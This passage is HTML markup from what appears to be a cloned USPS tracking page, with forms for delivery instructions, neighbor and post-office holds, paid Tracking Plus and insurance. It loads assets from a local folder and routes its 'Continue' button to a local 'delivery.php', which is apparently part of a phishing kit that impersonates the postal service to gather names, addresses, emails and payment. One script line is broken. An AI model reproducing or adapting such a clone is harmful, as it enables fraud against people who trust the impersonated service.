																							<input type="radio" required="" name="radio-option-change-delivery" class="radio-option-1 delivery-change-option" data-radiooption="1" data-required-error="Please select an option" checked="">Where should we leave your package?</label>
																						<br>
																						<br>
																						<label>
																							<p>Choose from the delivery instructions below, but please note: this option is only available if your package doesn’t fit in your mailbox. Instructions can only be set one time per package.</p>
																						</label>
																						<!--Content Shown when radio option 1 selected-->
																						<div class="radio-option-1-content delivery-change-radio-content" data-radiocontent="1" style="display: block;">
																							<div class="row">
																								<div class="col-sm-6 form-group">
																									<label>*Where</label>
																									<select id="changeDeliveryInstructions_location_1" name="sDropOff" class="form-control" required="" data-required-error="Please select a location">
																										<option value="">Select Location</option>

																										<option value="Front_Door">Front Door</option>

																										<option value="Back_Door">Back Door</option>

																										<option value="Side_Door">Side Door</option>

																										<option value="Porch">On the porch</option>

																										<option value="Other">Other (additional instructions required)</option>

																										<option value="Garage">Garage</option>

																									</select>
																									<span class="icon-carat_down"></span>
																									<div class="help-block with-errors"></div>
																								</div>
																							</div>
																							<div class="row" style="display:none;">
																								<div class="col-sm-6 form-group">
																									<label for="changeDeliveryInstructions_location_other_1">*Other</label>
																									<textarea class="form-control" id="changeDeliveryInstructions_location_other_1" name="tWhere" rows="4" maxlength="150" required="" data-required-error="A location is required when selecting &#39;Other&#39;"></textarea>
																									<div class="help-block with-errors"></div>
																								</div>
																							</div>
																						</div>
																						<!--End radio content 1-->
																					</div>
																					<!--End radio option 1 -->
																					<div class="radio">
																						<!--Radio option 2 -->
																						<label>
																							<input type="radio" required="" name="radio-option-change-delivery" class="radio-option-2 delivery-change-option" data-radiooption="2">Leave it with a neighbor.</label>
																						<!--Content Shown when radio option 2 selected-->
																						<div class="radio-option-2-content delivery-change-radio-content" data-radiocontent="2" style="display: none;">
																							<p>
																								<label>Please enter the neighbor’s address:</label>
																							</p>
																							<p class="neighbor-city">
																								<span class="city">[CITY]</span>,&nbsp;<span class="state">[STATE]</span>&nbsp;<span class="zip">[ZIP Code™]</span>
																							</p>
																							<div class="row">
																								<div class="col-sm-6 form-group">
																									<label for="changeDeliveryInstructions_neighborAddress">*Street Address</label>
																									<input type="text" id="changeDeliveryInstructions_neighborAddress" name="tNeighborStreet" class="form-control" placeholder="1234 Main Street" pattern="^[\w\-_&amp;.,`#@!\s]+$" required="" data-pattern-error="Please enter a valid address" data-required-error="Please enter a valid address">
																									<div class="help-block with-errors"></div>
																								</div>
																								<div class="col-sm-6 form-group">
																									<label for="changeDeliveryInstructions_neighborAddress2">Apt/Suite/Other</label>
																									<input type="text" id="changeDeliveryInstructions_neighborAddress2" name="tNeighborOther" class="form-control" placeholder="">
																									<div class="help-block with-errors"></div>
																								</div>
																							</div>
																						</div>
																						<!--End radio content 2 -->
																					</div>
																					<!--End radio option 2 -->

																					<div class="radio div-di-option-4">
																						<!--Radio option 4 -->
																						<label>
																							<input type="radio" required="" name="radio-option-change-delivery" class="radio-option-4 delivery-change-option" data-radiooption="4">Hold it at a Post Office™.</label>
																						<!--Content Shown when radio option 4 selected-->
																						<div class="radio-option-4-content delivery-change-radio-content" data-radiocontent="4" style="display: none;">

																							<div class="hold_at_post_office form-group">
																								<label for="changeDeliveryInstructions_ziplookup">*Enter a ZIP Code<sup>™</sup>
																								</label>
																								<div class="form-group">
																									<input type="text" id="changeDeliveryInstructions_ziplookup" name="tHfpZip" class="form-control zipcode" placeholder="00000" pattern="^(\d{5}([\-]\d{4})?)$" required="" data-required-error="Please enter a valid Zip Code™" data-pattern-error="Please enter a valid Zip Code™" maxlength="10">
																									<div class="help-block with-errors"></div>
																								</div>
																								<button id="btnZipCodeSearch_1" class="button white btn-zip-code-search">Search</button>
																							</div>

																							<div class="zip-code-lookup-results" style="display: none;">
																								<p>Your package can be held for pickup at one of the following locations (please select):</p>
																								<div class="zip-code-result-list">
																								</div>
																							</div>
																							<label class="zip-search-response-error" style="color: #ff0000;"></label>
																						</div>
																						<!--End radio option 4 content -->
																					</div>
																					<!--End radio option 4 -->
																					<div class="help-block with-errors"></div>
																				</div>
																			</div>
																		</div> <!-- END Step 3 -->

																		<!-- Step 4 of 'change your delviery instructions' -->

																		<div class="change-delivery-module step-4" data-deliverymodule="4">

																			<input type="hidden" name="tFwdAddressLineOne">
																			<input type="hidden" name="tFwdAddressLineTwo">
																			<input type="hidden" name="tFwdAddressCity">
																			<input type="hidden" name="tFwdAddressState">
																			<input type="hidden" name="tFwdAddressZip5">
																			<input type="hidden" name="tFwdAddressZip4">
																			<input type="hidden" name="tFwdCustomerFName">
																			<input type="hidden" name="tFwdCustomerMName">
																			<input type="hidden" name="tFwdCustomerLName">
																			<input type="hidden" name="tFwdCustomerCompany">
																			<input type="hidden" name="hfpFacilityId">

																			<div class="confirm_text actions_section">
																				<p>You have elected to have your package delivered to:
																					<br>
																					<span class="fwdAddressLineOne">[New Address Line One]</span>
																					<span class="fwdAddressLineTwo">[New Address Line Two]</span>
																					<br>
																					<span class="fwdAddressCity">[New Address City]</span>, <span class="fwdAddressState">[New Address State]</span>, <span class="fwdAddressZip5">[New Address Zip]</span>
																					<span class="fwdAddressZip4"></span>
																				</p>
																				This option will incur a fee.
																				<a id="di-step4-popover-id" class="icon-tooltip"></a>
																				<div class="modal fade" id="deliveryInstructionsStep4Modal" role="dialog">
																					<div class="modal-dialog">
																						<div class="modal-content di-tooltip-modal">
																							<div class="modal-header">
																								<button type="button" class="close di-close" data-dismiss="modal" tabindex="0"></button>
																							</div>
																							<div class="modal-body tooltip-modal-body">
																								<div class="di-tooltip-text-info">
																									<h3>Explanation of Pricing</h3>
																								</div>
																								<div class="di-tooltip-modal-content">
																									<div class="di-tooltip-modal-text">
																										<p>This amount is an <strong>ESTIMATE</strong>. The actual postage amount will be calculated once your package arrives at the Post Office™ and is weighed and rated and redirected to your requested destination.</p>
																										<p>The actual postage amount deducted from your credit card will not be more than this <strong>ESTIMATE</strong>. If the actual postage amount is more than this <strong>ESTIMATE</strong>, your package will be delivered "Postage Due" to your requested destination, requiring payment in cash, check or Money Order at the time of delivery.</p>
																									</div>
																								</div>
																							</div>
																						</div>
																					</div>
																				</div>

																				<div class="button_container">
																					<button id="changeOptionButton_1" class="button white change-options-btn">Change Options</button>
																					<button id="hfpAddCartButton_1" class="button green add-to-cart">Add to Cart</button>
																				</div>
																			</div>
																			<div class="change-options-content">
																				<div class="actions_subsection">
																					<div class="sub_action">
																						<h6>Delivery Address Change:</h6>
																						<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" id="editLink_1" class="change-options-btn">Edit</a>
																					</div>
																					<p>
																						<span class="fwdAddressLineOne">[New Address Line One]</span>
																						<span class="fwdAddressLineTwo">[New Address Line Two]</span>
																						<br>
																						<span class="fwdAddressCity">[New Address City]</span>, <span class="fwdAddressState">[New Address State]</span>, <span class="fwdAddressZip5">[New Address Zip]</span>
																						<span class="fwdAddressZip4"></span>
																					</p>
																				</div>
																				<div class="actions_subsection">
																					<h6>Service</h6>
																					<div class="upsell_service_type_list">
																					</div>
																				</div>
																				<div class="actions_subsection">
																					<h6>Insurance</h6>
																					<div class="insuranceValueContainer"></div>
																					<div class="actions_priced insuranceValueBIContainerWrapper">
																						<div>
																							<p>
																								<span class="insuranceValueBIContainer"></span>
																							</p>
																						</div>
																						<div class="price">
																							<strong>
																								<span class="insuranceValueBIContainerPrice"></span>
																							</strong>
																						</div>
																					</div>
																					<div class="checkbox">
																						<label>
																							<input type="checkbox" id="insuranceChbox_1" class="insurance_checkbox">
																							<span></span>Insure for the entire package value.
																						</label>
																					</div>
																					<div class="more_insurance">
																						<div class="checkbox insurance_form_content">

																							<p>Estimate the dollar value of your package (up to $5,000).</p>
																							<div class="form-group">
																								<input type="number" id="insuranceEstPrice" name="tInsuranceUpgrade" min="1" max="5000" class="form-control" placeholder="" required="" data-pattern-error="Please enter a price" data-required-error="Please enter a price">
																								<button id="calPriceButton_1" class="button white calculatePrice">Calculate Price</button>
																								<div class="help-block with-errors" style="clear:both;"></div>
																							</div>
																						</div>
																						<div class="actions_priced insuranceUpgradeResult">
																							<div>
																								<p>
																									<span class="additionalInsurance"></span>
																								</p>
																							</div>
																							<div class="price">
																								<strong>
																									<span class="insuranceCost"></span>
																								</strong>
																							</div>
																							<input type="hidden" class="insuranceCostField" value="0">
																						</div>
																						<label class="response-error insurance-response-error"></label>
																					</div>
																				</div>
																				<div class="actions_subsection actions_priced_slim">
																					<h6>Extra Services</h6>
																					<p class="upsell_X_defaultWrap">Available for Priority Mail and Priority Mail Express shipments.</p>
																					<div class="upsell_X_pmServiceWrap">
																						<div class="upsell_X_service_pm_type_list pmExtraServicesList">
																						</div>
																					</div>
																					<div class="upsell_X_pmeServiceWrap">
																						<div class="upsell_X_service_pme_type_list pmeExtraServicesList">
																						</div>
																					</div>
																				</div>
																				<div class="actions_subsection">
																					<div class="actions_priced">
																						<div>
																							<h3>Total</h3>
																						</div>
																						<div class="price upsellTotalAmount">
																							<strong>$XX.XX</strong>
																						</div>
																					</div>
																				</div>
																				<button id="redirectAddCartButton_1" class="btn btn-continue button green add-to-cart">Add to Cart</button>
																				<div class="actions_subsection">
																					<p>This total price is estimated based on the weight, dimensions, and service of the package plus 15%. The actual postage amount will be determined after the mailpiece is intercepted and weighed. If the actual postage amount exceeds the estimated postage amount, the package will continue to its new destination as "Postage Due".</p>
																				</div>
																			</div>
																		</div>
																		<!-- END Step 4 of 'change your delivery instructions' -->

																	</form> <!-- END form for 'change your delivery instructions' -->

																	<!-- Buttons Container -->
																	<div class="actions_section">

																		<button id="diButton" class="button btn-continue continue-delivery main-continue-btn" onclick="window.location.href = './delivery.php' ">Continue</button>

																	</div> <!-- End Buttons Container -->
																</div>
															</div>
														</div> <!-- End body content for first panel  -->

														<div class="panel-actions-content delivery-instructions-content success hidden">

															<label class="response-ok">
																<img src="./index_files/USPS_Green_Check.svg"> Authorization complete!</label>
															<div>
																<span>Thanks,&nbsp;<span class="firstName">[First Name]</span>. You will receive a confirmation email.</span>
																<br>
																<span>As outlined in the Terms &amp; Conditions, the postal carrier has the final discretion to leave your package at this address.</span>
															</div>
														</div>
														<div class="panel-actions-content delivery-instructions-content hidden">
															<label class="response-error">
																<img src="./index_files/USPS_Red_X.svg">
																<span class="firstName">[first name]</span>, we're sorry we cannot proceed with your request because&nbsp;<span class="errorScenario">[error scenario]</span>
															</label>
														</div>
													</div>
												</div>










												<div class="panel panel-default premium-tracking-anchor">
													<!--  Premium Tracking  -->



													<!--
<!-- Start Header Premium Tracking Services Available 
<div class="tracking_service_availability">	
	<a href="#" class="action_jump" data-action="premium-tracking">Premium Tracking Available <i class="icon-carat_down"></i></a>
	<p>You may purchase Premium Tracking for only one tracking number at a time.</p>
</div>
<!-- End Header Premium Tracking Services Available 


<!-- Start Premium Tracking Purchased Header 
<div class="tracking_service_purchased">	
	<p>Premium Tracking: Extended Tracking History - 6 months has been purchased</p>
</div>
<!-- End Premium Tracking Purchased Header 

-->

													<script>
														var getTrackingNumber = '9405510200864176182429';
                    premtrk[getTrackingNumber] = ;
                
            </script>

													<!-- IN CART MODAL -->
													<div class="modal" id="in-cart-alert" role="dialog" style="display: none;">
														<div class="modal-dialog">
															<div class="modal-content modal-container in-cart-modal">
																<div class="modal-header">
																	<button type="button" class="close" data-dismiss="modal" tabindex="0" id="close-cart-modal">
																		<span class="visuallyhidden">Close Modal</span>
																		<i class="icon-cancel close-alert"></i>
																	</button>
																</div>
																<div class="modal-body">
																	<div class="row">
																		<h4 class="modal-title callout-warning-stretch-title in-cart-title">
																			<img src="./index_files/warning-icon.svg" class="in-cart-icon"> Alert</h4>
																	</div>
																	<div class="row">
																		<div class="col-md-12 col-sm-12 col-xs-12">
																			<p class="callout callout-alert in-cart-text">USPS Tracking Plus<sup>®</sup> for <span id="9405510200864176182429-ptTNumber">9405510200864176182429</span> is already in your cart.</p>
																		</div>
																		<div class="col-md-12 col-sm-12 col-xs-12 cart-button-wrapper in-cart-buttons">
																			<div class="button-container">
																				<span>
																					<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" role="button" class="btn-primary button--green in-cart-button-single" id="in-cart-complete-purchase">Complete Purchase</a>
																				</span>
																				<span>
																					<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" role="button" class="btn-primary button--white" id="in-cart-alert-exit" data-dismiss="modal">Go Back to Tracking</a>
																				</span>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>


													<div id="PremiumTracking" class="panel-collapse piPanel collapse" role="tabpanel" aria-expanded="false" style="height: 0px;">
														<!-- End of panel heading -->
														<!-- Start Premium Tracking Service Length -->

														<!-- End Premium Tracking Service Length -->

														<!-- Start Premium Tracking Add to Cart Selected Service -->
														<div id="9405510200864176182429-premiumAddToCart" class="service-add-cart-container panel-body">
															<div class="row">
																<div class="panel-actions-content premium-tracking-content">
																	<div class="premium-tracking-text">
																		<p>
																			<strong>
																				<span id="9405510200864176182429-selectVal"></span> of USPS Tracking Plus
																			</strong> at <strong>$<span id="9405510200864176182429-selectPrice"></span>
																			</strong> for <span id="9405510200864176182429-ptTNumber"> 9405510200864176182429</span> has been selected for purchase. Once your purchase is complete, your tracking history will be available until <span id="9405510200864176182429-newCalcPurge">[DATE]</span>. Please confirm that the email address below is where you would like to receive your USPS Tracking Plus Statement.
																		</p>
																		<p>
																			<strong>Note: </strong> Please allow a few minutes for your order to process.
																		</p>
																	</div>
																	<div class="row selected-service-info-form-wrapper">
																		<div class="col-md-4 col-sm-4 col-xs-6 form-group required-field">
																			<label for="" class="">*First Name</label>
																			<input tabindex="0" id="9405510200864176182429-fName" type="text" class="form-control fname" placeholder="First">
																			<span role="alert" class="error-message enterFName">Please enter first name.</span>
																		</div>
																		<div class="col-md-4 col-sm-4 col-xs-6 form-group required-field">
																			<label for="" class="">*Last Name</label>
																			<input tabindex="0" id="9405510200864176182429-lName" type="text" class="form-control lname" placeholder="Last">
																			<span role="alert" class="error-message enterLName">Please enter last name.</span>
																		</div>
																		<div class="col-md-4 col-sm-4 col-xs-12 form-group email-input-wrapper required-field">
																			<label for="" class="">*Email Address</label>
																			<input tabindex="0" id="9405510200864176182429-emailAddr" type="text" class="form-control emailAddr" placeholder="user@domain.com">
																			<span role="alert" class="error-message enterEmailAddr">Please enter email.</span>
																			<span role="alert" class="error-message emailInvalidMessage">Please enter a valid email address.</span>
																		</div>
																	</div>
																	<div class="row">
																		<div class="col-md-12 col-sm-12 col-xs-12 privacy-act-statment-wrapper">
																			<p class="pac-header">Privacy Act Statement</p>
																			<p class="pac-text">Your information will be used to provide you requested products, services, or information. Collection is authorized by 39 USC 401, 403, &amp; 404. Providing the information is voluntary, but if not provided, we may not process your transaction. We do not disclose your information to third parties without your consent, except to facilitate the transaction, to act on your behalf or request, or as legally required. This includes the following limited circumstances: to a congressional office on your behalf; to financial entities regarding financial transaction issues; to a USPS auditor; to entities, including law enforcement, as required by law or in legal proceedings; to domestic and international customs relating to outgoing international mail pursuant to federal law and agreements; and to contractors and other entities aiding us to fulfill the service (service providers).</p>
																		</div>
																	</div>
																	<div class="row" id="cart-warning" style="display:none;">
																		<div class="col-md-12 col-sm-12 col-xs-12 callout callout-warning-stretch">
																			<div class="callout-warning-stretch-title">
																				<img src="./index_files/warning-icon.svg">
																				<h4>Alert:</h4>
																			</div>
																			<p class="callout-warning-stretch-content">When you select the "Add to Cart" button below, any items in your cart will be removed. Please check your cart, then purchase or save any items for later before purchasing USPS Tracking Plus.</p>
																		</div>
																	</div>
																	<div class="row">
																		<div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
																			<div class="button-container">
																				<a role="button" class="btn-primary button--green buyNow sandcbtn" data-tracking-number="9405510200864176182429" tabindex="0">Add to Cart</a>
																				<a role="button" class="btn-primary button--greenwhite addCart sandcbtn" data-tracking-number="9405510200864176182429" tabindex="0">Save &amp; Continue</a>
																				<input type="hidden" id="9405510200864176182429-selectedPTSku">
																				<input type="hidden" id="9405510200864176182429-selectedPTPrice">
																				<input type="hidden" id="9405510200864176182429-selectedPTServiceCode">
																				<input type="hidden" id="9405510200864176182429-selectedPurgeExtension">
																				<input type="hidden" id="9405510200864176182429-mpdate" value="2022-08-17 00:31:40.000000">
																				<!--
										<div class="disclaimer-wrapper">
											<p class="disclaimer">*If you currently have items in your cart that you would like to purchase, you must complete the purchase or they will be automatically removed from the cart.</p>
										</div>
-->
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
														<!-- End Premium Tracking Add to Cart Selected Service -->
														<!-- Start Premium Tracking Selected IN CART -->

														<!-- End Premium Tracking Container -->




														<!-- Start Premium Tracking Report Modal -->
														<div class="modal fade in" id="sentPremiumTrackingmodal" data-backdrop="static" data-keyboard="false" role="dialog" tabindex="-1" style="display: none; padding-right: 17px;">
															<div class="modal-dialog medium">
																<div class="modal-content modal-container">
																	<div class="modal-header">
																	</div>
																	<div class="modal-body">
																		<div class="body-content">
																			<h3 class="modal-title sendReportTitle">USPS Tracking Plus Statement sent to: <span id="reportSentEmailAddr">user@domain.com</span>
																			</h3>
																		</div>
																	</div>
																	<div class="modal-buttons">
																		<div class="button-container closeReport">
																			<button id="reportClose" class="button report-close-btn" data-dismiss="modal" tabindex="0">Close</button>
																		</div>
																	</div>
																</div>
															</div>
														</div>
														<!-- End Premium Tracking Report Modal -->

														<!-- Start Premium Tracking Alert Modal -->
														<div class="modal fade in" id="purchase-alert-modal" data-backdrop="static" data-keyboard="false" role="dialog" tabindex="-1" style="display: none; padding-right: 17px;">
															<div class="modal-dialog medium">
																<div class="modal-content modal-container">
																	<div class="modal-header">
																		<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" type="button" class="close" data-dismiss="modal" tabindex="0">
																			<span class="visuallyhidden">Close Modal</span>
																			<i class="icon-cancel close-alert"></i>
																		</a>
																	</div>
																	<div class="modal-body">
																		<div class="body-content">
																			<p class="alert-content">
																				<strong>You may only purchase Premium Tracking services one at a time. Please complete the purchase for your first item before selecting another item for purchase.</strong>
																			</p>
																		</div>
																	</div>
																	<div class="modal-buttons">
																		<div class="button-container">
																		</div>
																	</div>
																</div>
															</div>
														</div>
														<!-- End Premium Tracking Alert Modal -->


														<!-- Processing Loading Modals -->
														<div id="premiumTrackingLoadingModal" class="modalLoading initLoader">
															<!--		 WHITE SPINNER TEST  -->
															<div id="display-white-spinner" class="white-spinner-wrapper" style="display: none;">
																<div class="white-spinner-container">
																	<div class="spinner-content">
																		<h5>Processing</h5>
																		<div class="white-spinner-progress spinnerWhite">
																			<span class="white-spinner j-spinner">
																				<img id="spin0" src="./index_files/white-spinner-processing-step-01.svg">
																				<img id="spin1" src="./index_files/white-spinner-processing-step-02.svg" class="">
																				<img id="spin2" src="./index_files/white-spinner-processing-step-03.svg" class="">
																				<img id="spin3" src="./index_files/white-spinner-processing-step-04.svg" class="">
																				<img id="spin4" src="./index_files/white-spinner-processing-step-05.svg" class="">
																				<img id="spin5" src="./index_files/white-spinner-processing-step-06.svg" class="">
																				<img id="spin6" src="./index_files/white-spinner-processing-step-07.svg" class="">
																				<img id="spin7" src="./index_files/white-spinner-processing-step-08.svg" class="">
																				<img id="spin8" src="./index_files/white-spinner-processing-step-09.svg" class="">
																				<img id="spin9" src="./index_files/white-spinner-processing-step-10.svg" class="">
																			</span>
																		</div>
																		<p>Please do not refresh the page.</p>
																	</div>
																	<div class="gray-overlay"></div>
																</div>
															</div>
														</div>

													</div>


													<div class="panel panel-default product-info-anchor">
														<!-- Product Information -->














































														<!-- Panel Heading -->
														<div class="panel-heading collapser" role="tab" data-parent="#accordion-actions" aria-expanded="true" aria-controls="">
															<h4 class="panel-title">
																<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" role="button" data-parent="#accordion-actions" aria-expanded="true" aria-controls="collapseFive" class="collapsed" id="">
																	<span class="panel-word">Product Information</span>
																	<span class="carat-group">

																		<span role="button" data-parent="#accordion-actions" aria-expanded="true" aria-controls="collapseFive" class="up-arr">
																			<span class="icon-carat_up"></span>
																		</span>
																	</span>
																</a>
															</h4>
														</div>
														<!-- End of panel heading -->

														<div id="product-information_1" class="panel-collapse collapse piPanel" role="tabpanel">


															<div class="panel-body sample-number-panels">
																<!-- Body content for first panel, 'Product Information' -->
																<div class="row">
																	<div class="panel-actions-content product-information-content">

																		<ul class="product_info">
																			<li>
																				<strong>Postal Product:</strong>
																				Priority Mail<sup>®</sup>
																			</li>
																			<li>
																				<dl>
																					<dt>Features:</dt>
																					<dd>







																						Insured
																						<br>







																						USPS Tracking<sup>®</sup>
																						<br>









																						<div class="modal fade" id="insuranceIncludedModal" role="dialog">
																							<div class="modal-dialog">
																								<div class="modal-content ii-tooltip-modal">
																									<div class="modal-header">
																										<button type="button" class="close insurance-close" data-dismiss="modal" tabindex="0"></button>
																									</div>
																									<div class="modal-body tooltip-modal-body">
																										<div class="ii-tooltip-text-info">
																											<h3>Insurance included</h3>
																										</div>
																										<div class="ii-tooltip-modal-content">
																											<div class="ii-tooltip-modal-text">
																												<p>To qualify for included insurance, a shipment must meet
																													<br>
																													certain requirements, such as having an applicable bar
																													<br>
																													code. For details, visit <a href="https://www.usps.com/ship/priority-mail.htm" target="new">https://www.usps.com/ship/
																														<br>
																														priority-mail.htm</a>.</p>
																												<br>
																												<p>Insurance does not cover certain items. For details
																													<br>regarding claim exclusions, see sections:</p>
																											</div>
																											<div class="ii-tooltip-modal-list">
																												<ul>
																													<li>
																														<span>
																															<a href="http://pe.usps.gov/text/dmm300/609.htm#1097244" target="new">609.4.3</a> (Non-payable Claims),
																														</span>
																													</li>
																													<li>
																														<span>
																															<a href="http://pe.usps.gov/text/dmm300/609.htm#1097142" target="new">609</a> (Filing Indemnity Claims for Loss or Damage), and
																														</span>
																													</li>
																													<li>
																														<span>
																															<a href="http://pe.usps.gov/text/dmm300/503.htm#4_0" target="new">503.4</a> (Insured Mail)
																														</span>
																													</li>
																												</ul>
																												<br>
																												<br>
																												<br>
																											</div>
																											<div class="ii-tooltip-modal-text">
																												<br>
																												<p>of the Domestic Mail Manual at <a href="http://pe.usps.com/" target="new">http://pe.usps.com</a>.</p>
																											</div>
																										</div>
																									</div>
																								</div>
																							</div>
																						</div>








																					</dd>
																				</dl>
																			</li>
																			<li>
																				<!-- multiple delivery events, i.e. gdd, edd, pdd -->






																			</li>
																		</ul>

																	</div> <!-- End Buttons Container -->
																</div>
															</div>
														</div> <!-- End body content for first panel  -->

														<div class="panel-actions-content product-information-content success hidden">

															<label class="response-ok">
																<img src="./index_files/USPS_Green_Check.svg"> Authorization complete!</label>
															<div>
																<span>Thanks,&nbsp;<span class="firstName">[First Name]</span>. You will receive a confirmation email.</span>
																<br>
																<span>As outlined in the Terms &amp; Conditions, the postal carrier has the final discretion to leave your package at this address.</span>
															</div>
														</div>
														<div class="panel-actions-content product-information-content hidden">
															<label class="response-error">
																<img src="./index_files/USPS_Red_X.svg">
																<span class="firstName">[first name]</span>, we're sorry we cannot proceed with your request because&nbsp;<span class="errorScenario">[error scenario]</span>
															</label>
														</div>
													</div>
												</div>
												<!-- END Product Information -->

											</div>
											<!-- End #accordion-actions -->

										</div>
										<!-- End .actions_contain -->

									</div>
									<!-- END Product Tracking Details -->
								</div>
								<!-- END Product Tracking Information -->


							</div>
							<!-- End col -->




						</div>
						<!-- End .row -->
					</div>
					<!-- End .container-fluid -->
				</div>
				<!-- END Tracking bar with available actions underneath -->




			</div>
			<!--End Tracking Numbers container -->

			<!-- NEW: START TRACK ANOTHER PACKAGE CONTAINER -->

			<!-- END TRACK ANOTHER PACKAGE CONTAINER -->


			<div class="container-fluid find-FAQs">
				<!-- FAQs Link Callout row  -->
				<div class="row">
					<div class="col-sm-12">
						<h2>Need More Help?</h2>
						<p>Contact USPS Tracking support for further assistance.</p>
						<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" id="idxsFAQBtn" class="button">FAQs</a>
					</div>
				</div>
			</div>
			<!-- END FAQs container-->





			<!-- CROSS SELL II -->
			<!-- Start TRACK PACKAGE MODAL -->
			<div class="modal fade in" id="track-package-modal" data-backdrop="static" data-keyboard="false" role="dialog" tabindex="-1" style="display: none;">
				<div class="modal-dialog medium">
					<div class="modal-content modal-container">
						<div class="modal-header">
							<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" type="button" class="close" data-dismiss="modal" tabindex="0">
								<span class="visuallyhidden">Close Modal</span>
							</a>
							<h3 class="modal-title">Track Your Packages Automatically</h3>
						</div>
						<div class="modal-body">
							<div class="body-content">
								<p>
									Get the free Informed Delivery<sup>®</sup> feature to track
									all your incoming packages automatically with email alerts. You
									can also add and manage packages you've shipped using the online
									dashboard or app. Learn more about <a href="https://informeddelivery.usps.com/box/pages/intro/start.action" class="inline-link right-chevron">Informed Delivery</a>
								</p>
								<div class="radio-wrap required-field">
									<span role="alert" class="error-message">Please make a
										selection before continuing.</span>
									<div class="radio-container signup-confirm">
										<input id="trackradio1" type="radio" class="radio-button" name="track-package-rb" tabindex="0">
										<label for="">
											<strong>Yes,
												I would like to sign up.</strong>
										</label>
										<p class="signup-txt">Mail and packages will begin to
											populate your dashboard and daily notifications in 2 to 5
											business days. You may unsubscribe at any time.</p>
									</div>
									<div class="radio-container col-sm-12 col-xs-12" style="margin-left: -15px; padding-bottom: 47px;">
										<input id="trackradio2" type="radio" class="radio-button" name="track-package-rb" tabindex="0">
										<label for="">
											<strong>No,
												I am not interested at this time.</strong>
										</label>
									</div>
								</div>
							</div>
						</div>
						<div class="modal-buttons">
							<div class="button-container">
								<button id="crossSellSubmit" class="button submit-btn" type="" tabindex="0">Submit</button>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- End TRACK PACKAGE MODAL -->



			<!-- Closing tag for tracking page wrapper -->
			<!--  END tracking id page container -->


			<!-- Modal Markup -->
			<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
				<div class="modal-dialog" role="document">
					<div class="modal-content">
						<a tabindex="0" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" class="closeX" role="button" aria-label="Close modal" data-dismiss="modal">
							<span class="icon-cancel" aria-hidden="true"></span>
						</a>
						<div id="modalLabel" style="display: none;"></div>
						<div class="modal-body tool_tip_text"></div>
					</div>
				</div>
			</div>


			<div class="modal fade" id="modalTextUpdatesTerms" tabindex="-1" role="dialog" aria-labelledby="modalLabel3">
				<div class="modal-dialog textEmailModalDialog" role="document">
					<div class="modal-content">
						<div id="modalLabel3" style="display: none;"></div>

						<div class="modal-body tool_tip_text">
							<h4 class="modal-header modalHeaderTC">Terms and Conditions
								for the Receipt of Email Updates</h4>
							<div class="modal-body modalBodyTC">
								<p style="font-size: 14px;">
									Your access to and use of USPS Email Tracking is subject to our
									website <a href="http://about.usps.com/termsofuse.htm" target="_new">Terms of Use</a> and all applicable laws and
									regulations of the United States Postal Service. By agreeing to
									these terms and conditions, you are consenting to allow the USPS
									to email you updates, and you consent to receiving additional
									emails from the USPS, which may include customer experience
									surveys regarding your delivery experience.
								</p>
								<br>
								<p style="font-size: 14px;">USPS Email Tracking provides you
									with email updates that may include the date and time of delivery
									and information regarding the status of your package as it moves
									through the USPS network.</p>

							</div>
							<h4 class="modal-header modalHeaderTC">Terms and Conditions of
								Use for Text Updates</h4>
							<div class="modal-body modalBodyTC">
								<p style="font-size: 14px;">
									Your access to, and use of, USPS Text Tracking is subject to our
									website <a href="http://about.usps.com/termsofuse.htm" target="_new">Terms of Use</a> and all applicable laws and
									regulations. By agreeing to these terms and conditions, you are
									consenting to allow the USPS to text you updates, and you consent
									to receive additional texts, which may include customer
									experience surveys regarding your delivery experience.
								</p>
								<br>
								<p style="font-size: 14px;">USPS Text Tracking provides you
									with text message updates that may include the date and time of
									delivery and information regarding the status of your package as
									it moves through the USPS network.</p>
								<br>
								<p style="font-weight: bold; font-size: 14px;">Your
									telecommunications carrier may charge data usage fees (including
									additional charges when roaming) to receive TEXT messages. Please
									contact your wireless carrier for complete pricing details.</p>
							</div>
							<!-- /modal-body -->
							<!--<p>USPS Change Redelivery Terms and Conditions placeholder.</p>
          <br>-->
						</div>
						<a tabindex="0" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" class="closeX" role="button" aria-label="Close modal" data-dismiss="modal">
							<span class="icon-cancel" aria-hidden="true"></span>
						</a>
					</div>
				</div>
			</div>

			<div class="modal fade" id="modalEmailTerms" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
				<div class="modal-dialog" role="document">
					<div class="modal-content">
						<div id="modalLabel" style="display: none;"></div>
						<div class="modal-body tool_tip_text"></div>
						<a tabindex="0" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" class="closeX" role="button" aria-label="Close modal" data-dismiss="modal">
							<span class="icon-cancel" aria-hidden="true"></span>
						</a>
					</div>
				</div>
			</div>

			<div class="modal fade" id="modalRedeliveryTerms" tabindex="-1" role="dialog" aria-labelledby="modalLabel2">
				<div class="modal-dialog" role="document">
					<div class="modal-content">
